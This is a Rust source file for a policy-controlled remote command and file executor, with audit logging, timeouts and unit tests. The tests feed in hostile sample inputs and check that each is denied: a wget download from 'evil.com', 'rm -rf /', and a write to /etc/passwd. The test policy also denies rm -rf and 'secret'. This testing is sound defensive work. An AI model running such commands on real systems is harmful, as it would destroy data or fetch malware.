//! Command execution with policy enforcement, timeout, and output limiting.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;

use chrono::Utc;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::{Duration, timeout};

#[cfg(feature = "sysinfo")]
use tokio::sync::Mutex;

use rf_audit::logger::AuditLogger;
use rf_audit::types::AuditEntry;
use rf_policy::rpc_policy::RpcPolicy;
use rf_rpc::types::{Action, Request, Response, RpcResult};

/// A completed background job.
struct CompletedJob {
    exit_code: i32,
    stdout: String,
    stderr: String,
}

/// State of a background job.
enum JobState {
    Running {
        #[allow(dead_code)] // Used for future signal forwarding
        pid: u32,
    },
    Completed(CompletedJob),
}

/// Executor handles RPC requests under policy control.
pub struct Executor {
    policy: Arc<RwLock<RpcPolicy>>,
    audit: Arc<dyn AuditLogger>,
    caller_key: String,
    agent_id: String,
    start_time: Instant,
    /// Background jobs tracked by job ID.
    jobs: Arc<tokio::sync::Mutex<HashMap<String, JobState>>>,
    /// Cached sysinfo System to avoid re-scanning on every metrics request.
    #[cfg(feature = "sysinfo")]
    sysinfo_cache: Arc<Mutex<sysinfo::System>>,
}

impl Executor {
    pub fn new(
        policy: Arc<RwLock<RpcPolicy>>,
        audit: Arc<dyn AuditLogger>,
        caller_key: String,
    ) -> Self {
        Self {
            policy,
            audit,
            caller_key,
            agent_id: String::new(),
            start_time: Instant::now(),
            jobs: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            #[cfg(feature = "sysinfo")]
            sysinfo_cache: Arc::new(Mutex::new(sysinfo::System::new_all())),
        }
    }

    /// Set the agent ID for status reporting.
    pub fn with_agent_id(mut self, id: String) -> Self {
        self.agent_id = id;
        self
    }

    /// Set the start time for uptime calculation.
    pub fn with_start_time(mut self, start: Instant) -> Self {
        self.start_time = start;
        self
    }

    /// Handle an incoming RPC request.
    pub async fn handle(&self, request: Request) -> Response {
        let start = Instant::now();

        let result = match &request.action {
            Action::Execute {
                command,
                env,
                workdir,
            } => {
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
            #[cfg(feature = "sysinfo")]
            Action::Metrics => self.handle_metrics().await,
            #[cfg(not(feature = "sysinfo"))]
            Action::Metrics => RpcResult::Error {
                message: "metrics not available (compiled without sysinfo feature)".into(),
            },
            Action::Status => self.handle_status(),
            Action::Read { path } => self.handle_read(path).await,
            Action::Write { path, data, mode } => self.handle_write(path, data, *mode).await,
            Action::List { path } => self.handle_list(path).await,
            Action::Signal { pid, signal } => self.handle_signal(*pid, *signal),
            Action::BackgroundExec {
                command,
                env,
                workdir,
            } => self.handle_background_exec(command, env, workdir).await,
            Action::JobQuery { job_id } => self.handle_job_query(job_id).await,
            Action::JobWait { job_id } => self.handle_job_wait(job_id).await,
            _ => RpcResult::Error {
                message: "action not yet implemented".into(),
            },
        };

        Response {
            id: request.id,
            result,
        }
    }

    async fn handle_execute(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Policy check
        let decision = policy.check_command(command);
        let duration_ms = start.elapsed().as_millis() as u64;

        if !decision.allowed {
            if let Err(e) = self.audit.log(AuditEntry {
                timestamp: Utc::now(),
                request_id: request_id.to_string(),
                action: "execute".into(),
                command: Some(command.to_string()),
                decision: "denied".into(),
                matched_rule: decision.matched_rule.clone(),
                exit_code: None,
                duration_ms,
                caller_key: self.caller_key.clone(),
            }) {
                tracing::error!("audit log write failed: {}", e);
            }

            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }

        // Execute with timeout
        let timeout_dur = Duration::from_secs(policy.timeout_seconds as u64);
        let max_output = policy.max_output_bytes as usize;
        drop(policy); // Release read lock before spawning

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);

        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }

        for (k, v) in env {
            cmd.env(k, v);
        }

        let output = match timeout(timeout_dur, cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {}", e),
                };
            }
            Err(_) => {
                return RpcResult::Error {
                    message: format!("timeout after {}s", timeout_dur.as_secs()),
                };
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout[..output.stdout.len().min(max_output)])
            .to_string();
        let stderr = String::from_utf8_lossy(&output.stderr[..output.stderr.len().min(max_output)])
            .to_string();
        let exit_code = output.status.code().unwrap_or(-1);
        let duration_ms = start.elapsed().as_millis() as u64;

        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: "execute".into(),
            command: Some(command.to_string()),
            decision: "allowed".into(),
            matched_rule: decision.matched_rule,
            exit_code: Some(exit_code),
            duration_ms,
            caller_key: self.caller_key.clone(),
        }) {
            tracing::error!("audit log write failed: {}", e);
        }

        RpcResult::Success {
            stdout,
            stderr,
            exit_code,
            duration_ms,
        }
    }

    #[cfg(feature = "sysinfo")]
    async fn handle_metrics(&self) -> RpcResult {
        let mut sys = self.sysinfo_cache.lock().await;
        sys.refresh_all();
        let stdout = format!(
            "{{\"hostname\":\"{}\",\"cpus\":{},\"memory_total_mb\":{},\"memory_used_mb\":{}}}",
            sysinfo::System::host_name().unwrap_or_default(),
            sys.cpus().len(),
            sys.total_memory() / 1024 / 1024,
            sys.used_memory() / 1024 / 1024,
        );

        RpcResult::Success {
            stdout,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_status(&self) -> RpcResult {
        RpcResult::StatusInfo {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_seconds: self.start_time.elapsed().as_secs(),
        }
    }

    async fn handle_read(&self, path: &str) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check (check_path resolves symlinks internally)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        // Resolve for actual read
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {}", e),
                };
            }
        };

        match tokio::fs::read(&resolved).await {
            Ok(data) => {
                let truncated = if data.len() > max_output {
                    data[..max_output].to_vec()
                } else {
                    data
                };
                // Return file content as base64 in stdout
                use base64::Engine;
                let encoded = base64::engine::general_purpose::STANDARD.encode(&truncated);
                RpcResult::Success {
                    stdout: encoded,
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("read file: {}", e),
            },
        }
    }

    async fn handle_write(&self, path: &str, data: &[u8], mode: Option<u32>) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy);

        // Atomic write: write to temp file then rename
        let temp_path = format!("{}.rf_tmp", path);
        if let Err(e) = tokio::fs::write(&temp_path, data).await {
            return RpcResult::Error {
                message: format!("write temp file: {}", e),
            };
        }

        // Set permissions if specified (Unix only)
        #[cfg(unix)]
        if let Some(m) = mode {
            use std::os::unix::fs::PermissionsExt;
            let perms = std::fs::Permissions::from_mode(m);
            if let Err(e) = tokio::fs::set_permissions(&temp_path, perms).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("set permissions: {}", e),
                };
            }
        }
        // On non-Unix, mode is ignored
        #[cfg(not(unix))]
        let _ = mode;

        // Atomic rename
        if let Err(e) = tokio::fs::rename(&temp_path, path).await {
            let _ = tokio::fs::remove_file(&temp_path).await;
            return RpcResult::Error {
                message: format!("rename: {}", e),
            };
        }

        RpcResult::Success {
            stdout: format!("wrote {} bytes to {}", data.len(), path),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    async fn handle_list(&self, path: &str) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {}", e),
                };
            }
        };

        let mut entries = Vec::new();
        let mut dir = match tokio::fs::read_dir(&resolved).await {
            Ok(d) => d,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read dir: {}", e),
                };
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = entry.file_type().await.map(|t| t.is_dir()).unwrap_or(false);
            entries.push(if is_dir { format!("{}/", name) } else { name });
        }

        entries.sort();
        RpcResult::Success {
            stdout: entries.join("\n"),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_signal(&self, pid: u32, signal: i32) -> RpcResult {
        #[cfg(unix)]
        {
            // Send signal to process
            let result = unsafe { libc::kill(pid as libc::pid_t, signal as libc::c_int) };
            if result == 0 {
                RpcResult::Success {
                    stdout: format!("signal {} sent to pid {}", signal, pid),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            } else {
                RpcResult::Error {
                    message: format!(
                        "kill({}, {}): {}",
                        pid,
                        signal,
                        std::io::Error::last_os_error()
                    ),
                }
            }
        }
        #[cfg(not(unix))]
        {
            let _ = (pid, signal);
            RpcResult::Error {
                message: "signal not supported on this platform".into(),
            }
        }
    }

    async fn handle_background_exec(
        &self,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
    ) -> RpcResult {
        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_command(command);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);
        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }
        for (k, v) in env {
            cmd.env(k, v);
        }

        let child = match cmd
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {}", e),
                };
            }
        };

        let pid = child.id().unwrap_or(0);
        let job_id = uuid::Uuid::new_v4().to_string();

        // Store job as running
        {
            let mut jobs = self.jobs.lock().await;
            jobs.insert(job_id.clone(), JobState::Running { pid });
        }

        // Spawn background task to wait for completion
        let jobs = self.jobs.clone();
        let job_id_clone = job_id.clone();
        tokio::spawn(async move {
            match child.wait_with_output().await {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(
                        &output.stdout[..output.stdout.len().min(max_output)],
                    )
                    .to_string();
                    let stderr = String::from_utf8_lossy(
                        &output.stderr[..output.stderr.len().min(max_output)],
                    )
                    .to_string();
                    let exit_code = output.status.code().unwrap_or(-1);
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code,
                            stdout,
                            stderr,
                        }),
                    );
                }
                Err(_) => {
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code: -1,
                            stdout: String::new(),
                            stderr: "process wait failed".into(),
                        }),
                    );
                }
            }
        });

        RpcResult::JobStarted { job_id, pid }
    }

    async fn handle_job_query(&self, job_id: &str) -> RpcResult {
        let jobs = self.jobs.lock().await;
        match jobs.get(job_id) {
            Some(JobState::Running { .. }) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: true,
                exit_code: None,
                stdout: None,
                stderr: None,
            },
            Some(JobState::Completed(job)) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: false,
                exit_code: Some(job.exit_code),
                stdout: Some(job.stdout.clone()),
                stderr: Some(job.stderr.clone()),
            },
            None => RpcResult::Error {
                message: format!("unknown job: {}", job_id),
            },
        }
    }

    async fn handle_job_wait(&self, job_id: &str) -> RpcResult {
        // Poll until complete (with timeout)
        let deadline = tokio::time::Instant::now() + Duration::from_secs(300);
        loop {
            {
                let jobs = self.jobs.lock().await;
                if let Some(JobState::Completed(job)) = jobs.get(job_id) {
                    return RpcResult::JobStatus {
                        job_id: job_id.into(),
                        running: false,
                        exit_code: Some(job.exit_code),
                        stdout: Some(job.stdout.clone()),
                        stderr: Some(job.stderr.clone()),
                    };
                }
                if !jobs.contains_key(job_id) {
                    return RpcResult::Error {
                        message: format!("unknown job: {}", job_id),
                    };
                }
            }
            if tokio::time::Instant::now() > deadline {
                return RpcResult::Error {
                    message: format!("timeout waiting for job: {}", job_id),
                };
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rf_audit::logger::AuditLogger;
    use rf_audit::types::AuditEntry;
    use std::sync::Mutex;

    /// In-memory audit logger for testing.
    struct TestAuditLogger {
        entries: Mutex<Vec<AuditEntry>>,
    }

    impl TestAuditLogger {
        fn new() -> Self {
            Self {
                entries: Mutex::new(Vec::new()),
            }
        }

        fn entries(&self) -> Vec<AuditEntry> {
            self.entries.lock().unwrap().clone()
        }
    }

    impl AuditLogger for TestAuditLogger {
        fn log(&self, entry: AuditEntry) -> Result<(), rf_audit::logger::AuditError> {
            self.entries.lock().unwrap().push(entry);
            Ok(())
        }
    }

    fn test_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: "^echo .*"
      - pattern: "^cat /tmp/.*"
      - pattern: "^true$"
      - pattern: "^false$"
      - pattern: "^sleep .*"
    deny:
      - pattern: ".*rm.*-rf.*"
      - pattern: ".*secret.*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
        let policy = Arc::new(RwLock::new(test_policy()));
        Executor::new(policy, audit, "test-caller-key".into())
    }

    #[tokio::test]
    async fn test_execute_allowed_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-1".into(),
            action: Action::Execute {
                command: "echo hello world".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-1");

        if let RpcResult::Success {
            stdout, exit_code, ..
        } = &resp.result
        {
            assert_eq!(stdout.trim(), "hello world");
            assert_eq!(*exit_code, 0);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "allowed");
    }

    #[tokio::test]
    async fn test_execute_denied_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-2".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-2");

        if let RpcResult::Denied { reason, rule } = &resp.result {
            assert!(reason.contains("deny rule"));
            assert!(rule.contains("rm.*-rf"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }

        // Verify audit entry records denial
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "denied");
    }

    #[tokio::test]
    async fn test_execute_default_deny() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-3".into(),
            action: Action::Execute {
                command: "wget http://evil.com/malware".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Denied { reason, .. } = &resp.result {
            assert!(reason.contains("deny-by-default"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit_code() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-4".into(),
            action: Action::Execute {
                command: "false".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { exit_code, .. } = &resp.result {
            assert_ne!(*exit_code, 0);
        } else {
            panic!("expected success with non-zero exit, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-5".into(),
            action: Action::Execute {
                command: "sleep 10".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("timeout"));
        } else {
            panic!("expected timeout error, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_output_limiting() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Generate output larger than maxOutputBytes (1024)
        let req = Request {
            id: "req-6".into(),
            action: Action::Execute {
                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.len() <= 1024);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let mut env = std::collections::HashMap::new();
        env.insert("MY_VAR".into(), "test_value".into());

        let req = Request {
            id: "req-7".into(),
            action: Action::Execute {
                command: "echo $MY_VAR".into(),
                env,
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert_eq!(stdout.trim(), "test_value");
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_metrics_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-8".into(),
            action: Action::Metrics,
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.contains("cpus"));
            assert!(stdout.contains("memory_total_mb"));
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_read_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-9".into(),
            action: Action::Read {
                path: "/etc/hostname".into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { reason, .. } => {
                assert!(reason.contains("deny") || reason.contains("not allowed"));
            }
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_write_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-10".into(),
            action: Action::Write {
                path: "/etc/passwd".into(),
                data: b"evil".to_vec(),
                mode: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_list_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-11".into(),
            action: Action::List {
                path: "/root".into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_read_allowed_with_policy() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp, env::temp_dir may not be canonical)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n",
            tmp_base_str
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Create a temp file
        let tmp_file = tmp_base.join("rf_test_read.txt");
        tokio::fs::write(&tmp_file, b"hello world").await.unwrap();

        let req = Request {
            id: "req-12".into(),
            action: Action::Read {
                path: tmp_file.to_string_lossy().into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                use base64::Engine;
                let decoded = base64::engine::general_purpose::STANDARD
                    .decode(stdout)
                    .unwrap();
                assert_eq!(decoded, b"hello world");
            }
            _ => panic!("expected success, got {:?}", resp.result),
        }

        let _ = tokio::fs::remove_file(&tmp_file).await;
    }

    #[tokio::test]
    async fn test_write_and_list_allowed() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n",
            tmp_base_str
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        let test_dir = tmp_base.join("rf_test_dir");
        let _ = tokio::fs::create_dir(&test_dir).await;

        // Write a file
        let test_file = test_dir.join("test.txt");
        let req = Request {
            id: "req-13".into(),
            action: Action::Write {
                path: test_file.to_string_lossy().into(),
                data: b"file content".to_vec(),
                mode: Some(0o644),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("wrote 12 bytes"));
            }
            _ => panic!("expected success for write, got {:?}", resp.result),
        }

        // List directory
        let req = Request {
            id: "req-14".into(),
            action: Action::List {
                path: test_dir.to_string_lossy().into(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("test.txt"));
            }
            _ => panic!("expected success for list, got {:?}", resp.result),
        }

        // Cleanup
        let _ = tokio::fs::remove_dir_all(&test_dir).await;
    }

    #[tokio::test]
    async fn test_background_exec_and_wait() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Start background job
        let req = Request {
            id: "req-bg-1".into(),
            action: Action::BackgroundExec {
                command: "echo background-output".into(),
                env: HashMap::new(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        let job_id = match &resp.result {
            RpcResult::JobStarted { job_id, pid } => {
                assert!(*pid > 0 || *pid == 0); // pid may be 0 on some systems
                job_id.clone()
            }
            _ => panic!("expected JobStarted, got {:?}", resp.result),
        };

        // Wait for job
        let req = Request {
            id: "req-bg-2".into(),
            action: Action::JobWait {
                job_id: job_id.clone(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::JobStatus {
                running,
                exit_code,
                stdout,
                ..
            } => {
                assert!(!running);
                assert_eq!(*exit_code, Some(0));
                assert!(stdout.as_ref().unwrap().contains("background-output"));
            }
            _ => panic!("expected JobStatus, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_background_exec_query_unknown() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-bg-3".into(),
            action: Action::JobQuery {
                job_id: "nonexistent".into(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Error { message } => {
                assert!(message.contains("unknown job"));
            }
            _ => panic!("expected error, got {:?}", resp.result),
        }
    }
}
